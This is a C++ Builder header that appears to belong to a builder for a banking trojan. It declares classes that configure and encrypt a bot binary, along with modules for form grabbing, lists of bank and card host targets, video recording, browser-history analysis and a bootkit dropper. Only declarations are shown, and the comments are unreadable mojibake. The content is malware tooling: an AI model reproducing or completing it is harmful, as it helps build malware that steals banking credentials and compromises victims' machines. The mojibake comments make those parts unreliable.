//---------------------------------------------------------------------------
//  ������� ��� �������� ������ ����
//  ��� �������� �� C++ Builder
//---------------------------------------------------------------------------

#ifndef BuilderUtilsH
#define BuilderUtilsH
//---------------------------------------------------------------------------
#include <windows.h>
#include <Classes.hpp>


namespace Builder
{

	//-------------------------------------------------------------------
	//  PackStringsToDoubleZeroEndLine - ������� ����������� ������ �
	//		���� ������. ������ ������ ����� �������� ������� ��������.
	//		� ����� ��������� ������ ����� ������ ��� ������� �������
	//		������ ������ ����� ���������������.
	//
	//  Lines - �������� ����� �����
	//
	//  CryptLines - ��������� � ������������� ��������� ������ ������
	//				 ����� ���������.
	//
	//  TrimLines - ��������� ������� �������� � ���� � ������ ������.
	//
	//
	//  OutBuf - �������������� �����. ������ ���������� �������� MemAlloc
	//
	//  OutBufSize - ������ ��������������� ������
	//
	//  ������� ���������� ������ ���� ������� ��������� ����-�� ����
	//			������
	//
	//  ����������: � �������� ����� ����� Lines ����� ���� �������
	//              ���������. � ����� ���� ���������� ��������� ������
	//				� �������� ��������� ����������� �� �����
	//-------------------------------------------------------------------
	bool PackStringsToDoubleZeroEndLine(TStrings *Lines,
										bool CryptLines, bool TrimLines,
										PCHAR &OutBuf, DWORD &OutBufSize);
}




PCHAR Module_BankHosts       = "����� ������ BANKING";
PCHAR Module_Hunter          = "Hunter";
PCHAR Module_JavaConfig      = "������ JAVA";
PCHAR Module_VideoRecorder   = "������ �����";
PCHAR Module_FormGraber      = "���� ������";
PCHAR Module_AzConfig        = "��������� AZ";
PCHAR Module_SberHosts       = "����� Sber";
PCHAR Module_RafaHosts       = "����� Rafa";
PCHAR Module_CCHosts         = "����� CC";
PCHAR Module_HistoryAnalyzer = "���������� ������� ���������";
PCHAR Module_BootkitDroper   = "��������� ������� �������";



// ��������� ��� ������ � ������ �������
PCHAR Param_DroperNamePrefix = "__DROPER_NAME_PREFIX__";
PCHAR Param_TargetPlatform   = "__TARGET_PLATFORM__";
PCHAR Param_SVCFuckupEnabled = "__SVC_FUCKUP_ENABLED__";




// ������ ��������
#define BUILDER_VERSION 1.3


class TCustomBotModule;



class TBotBuilder;
class TBotModule;
class TBotParam;
class TBotModuleEdit;
class TBotStringsEncryptor;



enum TBotParamStatus {psOk, psWarning, psError};

typedef void __fastcall (__closure *TBuilderMessage)(TBotBuilder *Sender, const UnicodeString &Message);



//*****************************************************************
//  ����� �������� ���������� ����
//*****************************************************************
class TCustomParam : public TObject
{
private:
	TCustomBotModule* FOwner;
	AnsiString FName;
	UnicodeString FTitle;

	DWORD  FSize;      // ������� ������
	LPBYTE FData;      // ����� ������
	bool   FEncrypted; // ������� ����������� ������
	bool   FNotNull;   // ������� �� ����� ���� �������
    bool   FEnabled;   // ������� ����������� ���������

    DWORD FDataSize;   // ������ ���������� ������
    int   FPosition;   // ������� ��������� � ������

	friend class TCustomBotModule;

	void Clear();
	void ResetStatus();
	bool UpdateStatus(LPBYTE Buf, DWORD BufSize);

	AnsiString GetAsMultiLine();
	void	   SetAsMultiLine(const AnsiString& Value);
protected:
	void SetValue(LPVOID Data, DWORD Size, bool Encrypt);

	AnsiString virtual GetAsString();
	void       virtual SetAsString(const AnsiString& Value);

	bool Write(LPBYTE Buf, DWORD BufSize);
public:
	TCustomParam(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encrypted, bool NotNull, PCHAR Title);
	__fastcall ~TCustomParam();


    bool CheckParam(LPBYTE Buf);

	__property AnsiString Name = {read=FName};
	__property DWORD Size = {read=FSize};
	__property bool Enabled = {read=FEnabled, write=FEnabled};
	__property bool Encrypted = {read=FEncrypted};
	__property AnsiString AsString    = {read=GetAsString, write=SetAsString};
	__property AnsiString AsMultiLine = {read=GetAsMultiLine, write=SetAsMultiLine};

    __property int Position = {read=FPosition};
};



//*****************************************************************
//  ����� ��������� ������ ����
//*****************************************************************
class TCustomPassword : public TCustomParam
{
private:
    AnsiString FPassword;
protected:
	AnsiString GetAsString();
	void       SetAsString(const AnsiString& Value);
public:
	TCustomPassword(TCustomBotModule* AOwner, PCHAR Name, DWORD Size, bool Encrypted, bool NotNull, PCHAR Title);
	__fastcall ~TCustomPassword();
};



//*****************************************************************
//  ����� �������� ������ ���������� ����
//*****************************************************************
class TCustomBotModule : public TComponent
{
private:
	TList* FItems;

	friend class TCustomParam;

	void Clear();
	int  GetCount();
	bool GetActive();

	TCustomParam* GetItems(int Index);
protected:
	void virtual InsertItem(TCustomParam* Param);
	void virtual RemoveItem(TCustomParam* Param);

	void ResetParamsStatus();
	bool UpdateParamsStatus(const char* FileName);
	bool WriteParams(LPBYTE Buf, DWORD BufSize);
public:
	__fastcall TCustomBotModule(TComponent* AOwner);
	__fastcall ~TCustomBotModule();

	TCustomParam* GetParamForPos(int Position);

	__property bool Active = {read=GetActive};
	__property int  Count = {read=GetCount};
	__property TCustomParam* Items[int Index] = {read=GetItems};
};




//*****************************************************************
//  ������ ������� �������� ����
//*****************************************************************
class TBaseBotModule : public TCustomBotModule
{
private:
	// ������� ��������� ������
	TCustomParam* FPrefix;
	TCustomParam* FHosts;
	TCustomParam* FDelay;
	TCustomParam* FPassword;

	UnicodeString FFileName;

	UnicodeString GetResultFileName();
public:
	__fastcall TBaseBotModule(TComponent* AOwner);
	__fastcall ~TBaseBotModule();

	bool Open(const UnicodeString &FileName);
	bool Close();

	bool Buld();


	__property UnicodeString FileName = {read=FFileName};
	__property UnicodeString ResultFileName = {read=GetResultFileName};

	__property TCustomParam* Prefix   = {read=FPrefix};
	__property TCustomParam* Hosts    = {read=FHosts};
	__property TCustomParam* Delay    = {read=FDelay};
	__property TCustomParam* Password = {read=FPassword};
};








//*************************************************************
//  TBotBuilder - �����, ������� ����
//*************************************************************
class TBotBuilder : public TComponent
{
private:
	UnicodeString FSourceFileName;
	UnicodeString FResultFileName;
	bool FResultFileNameChanged;
	TCollection* FParams;
	TCollection* FModules;
	TList*       FActiveModules;
	TMemoryStream* FFile;   // ����������� ����
	TBotParam* FStringsPassword; // ������ ���������� �����
	TBotParam* FPrefix;     // ������� ����
	TBotParam* FPassword;   // ������ ����
	TBotParam* FDelay;      // ������ �������
	TBotParam* FHosts;      // �������� �����
	TBotStringsEncryptor *FStringsEncryptor; // ������� ���������� ����� ����
	TBuilderMessage FOnMessage;
	friend class TBotModule;
	friend class TBotParam;
	void __fastcall UpdateResultFileName(bool Reset);
	void __fastcall WriteParametr(PCHAR Buf, DWORD BufSize, TBotParam* Param);
	void __fastcall ActivateModules();
	void __fastcall DeactivateModules();
	int  __fastcall GetActiveModulesCount();
	int  __fastcall GetCount();
	TBotParam*   __fastcall GetParam(int Index);
	TBotModule*  __fastcall GetActiveModules(int Index);
	void __fastcall EncryptDllData(PCHAR Buf, DWORD BufSize, PCHAR Passw);
protected:
	void __fastcall virtual ParamValueChanged(TBotParam* Sender);
	void __fastcall Message(const UnicodeString &Message);
	void __fastcall Message(TStrings *Messages);
    void __fastcall InitializeModules();
public:
	__fastcall TBotBuilder(TComponent* AOwner);
	__fastcall ~TBotBuilder();

    TBotModule*     __fastcall AddModule(const char *Name);
	void            __fastcall LoadSourceFile(const UnicodeString &FileName);
	TBotParamStatus __fastcall CheckParams(TStrings* Errors, bool FullBuild);
	bool            __fastcall Build(bool FullBuild);
	TBotParam*      __fastcall ParamByName(const AnsiString &Name);
    void            __fastcall ClearParams();

	void __fastcall SaveToStream(TStream *Stream);
	void __fastcall LoadFromStream(TStream *Stream);
	void __fastcall SaveToFile(const UnicodeString &FileName);
	void __fastcall LoadFromFile(const UnicodeString &FileName);
	void __fastcall SetModuleEdit(const UnicodeString &Name, TBotModuleEdit* Edit);
    TBotModule* __fastcall ModuleByName(const UnicodeString &Name);



	__property UnicodeString SourceFileName = {read=FSourceFileName};
	__property UnicodeString ResultFileName = {read=FResultFileName};
	__property int ActiveModulesCount = {read=GetActiveModulesCount};
	__property int ActiveModules[int Index] = {read=GetActiveModules};

	// ������� ��������� ����
	__property TBotParam* Prefix   = {read = FPrefix};
	__property TBotParam* Password = {read = FPassword};
	__property TBotParam* Delay    = {read = FDelay};
	__property TBotParam* Hosts    = {read = FHosts};
	__property int        Count    = {read = GetCount};
	__property TBotParam* Params[int Index] = {read = GetParam};
	// �������
    __property TBuilderMessage OnMessage  = {read=FOnMessage, write=FOnMessage};
};


//*************************************************************
//  TBotModule - ����� �������� ���������� ������
//*************************************************************
class TBotParam : public TCollectionItem
{
private:
	TBotBuilder* FOwner;
	TBotModule*  FModule;
	AnsiString FName;
	bool  FEnabled;
	bool  FNotNull;   // ������������ ��������
	bool  FEncrypted; // �������� ������ ���� �����������
	DWORD FSize;      // ������ ������ ���������
	PCHAR FData;      // ������
	DWORD FDataSize;  // ������ ������
	UnicodeString FTitle;
	void __fastcall Changed();
	AnsiString __fastcall GetAsAnsiString();
	void __fastcall SetAsAnsiString(const AnsiString &Value);
	UnicodeString __fastcall GetAsUnicodeString();
	void __fastcall SetAsUnicodeString(const UnicodeString &Value);
	UnicodeString __fastcall GetAsStrings();
	void __fastcall SetAsStrings(const UnicodeString &Value);
	DWORD __fastcall GetAsLong();
	void __fastcall SetAsLong(DWORD Value);
	bool __fastcall GetAsBool();
	void __fastcall SetAsBool(bool Value);
	bool __fastcall GetActive();

	friend class TBotBuilder;
	friend class TBotModule;
protected:
	UnicodeString __fastcall GetDisplayName(void);
	void __fastcall SetSize(DWORD Value);
	void __fastcall virtual DoChanged();
	bool __fastcall virtual Write(PCHAR Buf, DWORD BufSize);
    bool __fastcall virtual WriteEmptyData(PCHAR Buf, DWORD BufSize);
	bool __fastcall DoWrite(PCHAR Buf, DWORD BufSize, PCHAR AData, DWORD ADataSize);
	__property PCHAR Data = {read = FData};
public:
	__fastcall TBotParam(TBotBuilder* AOwner, bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title);
	__fastcall ~TBotParam();

	bool __fastcall IsEmpty();
	void __fastcall Clear();
	void __fastcall SetValue(PCHAR Value, DWORD ValueSize);
    int  __fastcall Position(PCHAR Buf, DWORD BufSize);
	TBotParamStatus __fastcall virtual Status();

	void __fastcall SaveToStream(TStream *Stream);
	void __fastcall LoadFromStream(TStream *Stream);

	void __fastcall SaveToStrings(TStrings *Strings);
	void __fastcall LoadFromStrings(TStrings *Strings);

	__property bool Enabled = {read = FEnabled, write = FEnabled};
	__property bool Active  = {read=GetActive};
	__property TBotModule*  Module = {read=FModule};
	__property DWORD Size = {read=FSize};
	__property bool Encrypted = {read = FEncrypted};
	__property UnicodeString Title = {read = FTitle, write = FTitle};
	__property UnicodeString AsStrings = {read = GetAsStrings, write = SetAsStrings};
	__property DWORD         AsLong = {read = GetAsLong, write = SetAsLong};
	__property AnsiString    AsAnsiString = {read = GetAsAnsiString, write = SetAsAnsiString};
	__property UnicodeString AsUnicodeString = {read = GetAsUnicodeString, write = SetAsUnicodeString};
	__property bool          AsBool = {read = GetAsBool, write = SetAsBool};

};



//*************************************************************
//  TBotPassword - �������� ���� - ���� ����������
//  ������� �������� ������� �� ������� ����, ��� ����
//  ��������� ����������� � ����� �������� ��� ����������
//  ������������
//*************************************************************
class TBotPassword : public TBotParam
{
private:
	DWORD FRealSize;
protected:
	bool __fastcall Write(PCHAR Buf, DWORD BufSize);
	bool __fastcall WriteEmptyData(PCHAR Buf, DWORD BufSize);
public:
	__fastcall TBotPassword(TBotBuilder* AOwner, bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title);

};


//*************************************************************
//  TBotModule - ����� �������� ���������� ������
//*************************************************************
class TBotModule : public TCollectionItem
{
private:
	TBotBuilder* FBuilder;
	UnicodeString FName;
	TList *FParams;
	TBotModuleEdit* FEdit;
	bool FActive;
	friend class TBotBuilder;
	friend class TBotParam;
	int __fastcall GetParamsCount();
	TBotParam* __fastcall GetParams(int Index);
	bool __fastcall Activate(PCHAR Buf, DWORD BufSize);
public:
	__fastcall TBotModule(TBotBuilder* AOwner, const char *Name);
	__fastcall ~TBotModule();

	TBotParam* __fastcall AddParam(bool NotNull, bool Encrypted, const char* Name, DWORD Size, const char* Title);

    TBotParam* __fastcall ParamByName(const AnsiString &Name);
	bool __fastcall CanEdit();
    bool __fastcall Edit();

	__property bool Active = {read=FActive};
	__property TBotBuilder* Builder = {read = FBuilder};
	__property UnicodeString Name = {read=FName};
	__property int ParamsCount = {read=GetParamsCount};
	__property TBotParam* Params[int Index] = {read=GetParams};
};

//*************************************************************
//   TBotStringsEncryptor  - ����� ���������� ����� ����
//*************************************************************
class TBotStringsEncryptor : public TComponent
{
public:
	__fastcall TBotStringsEncryptor(TComponent *Owner);
	bool Encrypt(PCHAR Buf, DWORD BufSize, PCHAR Password);
};


//*************************************************************
//   TBotModuleEdit  - ����� �������� ������
//*************************************************************
class TBotModuleEdit
{
public:
	bool __fastcall virtual Execute(TBotModule *Module) = 0;
};



//*************************************************************
//   TBuildChecker  - ����� �������� ���������� ������
//*************************************************************
class TBuildChecker : public TComponent
{
private:
	UnicodeString FSourceFile;
	UnicodeString FResultFile;
	LPBYTE FSourceBuf;
	LPBYTE FResultBuf;
	DWORD FSourceSize;
	DWORD FResultSize;
	TBaseBotModule* FModule;
public:
	__fastcall  TBuildChecker(TComponent* AOwner, TBaseBotModule* AModule);
	__fastcall  ~TBuildChecker();

	bool OpenFiles(const UnicodeString& SourceFile, const UnicodeString& ResultFile);
	bool CompareBuffers(LPBYTE Source, DWORD SourceSize, LPBYTE Result, DWORD ResultSize);

	bool Check();
};



//---------------------------------------------------------------------------
#endif
